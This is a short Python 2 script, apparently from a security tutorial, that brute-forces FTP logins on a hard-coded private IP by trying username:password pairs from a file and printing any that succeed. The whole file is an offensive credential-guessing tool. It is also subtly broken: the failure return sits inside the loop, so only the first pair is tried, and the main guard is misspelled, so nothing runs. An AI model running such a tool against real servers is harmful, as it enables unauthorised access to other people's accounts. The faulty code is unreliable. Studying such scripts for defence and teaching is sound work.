import ftplib


def brute_login(hostname, password_file):
    p_f = open(password_file, 'r')
    for line in p_f.readlines():
        username = line.split(':')[0]
        password = line.split(':')[1].strip('\r').strip('\n')
        print "[+] Trying: " + username + "/" + password
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(username, password)
            print "\n[*] " + str(hostname) + " FTP Logon succeeded: " + \
                                            username + "/" + password
            ftp.quit()
            return (username, password)
        except Exception, e:
            pass
        print "\n[-] Could not brute force FTP credentials."
        return (None, None)

def main():
    host = '192.168.95.179'
    password_file = 'userpass.txt'
    brute_login(host, password_file)

if __name__ == "__main___":
    main()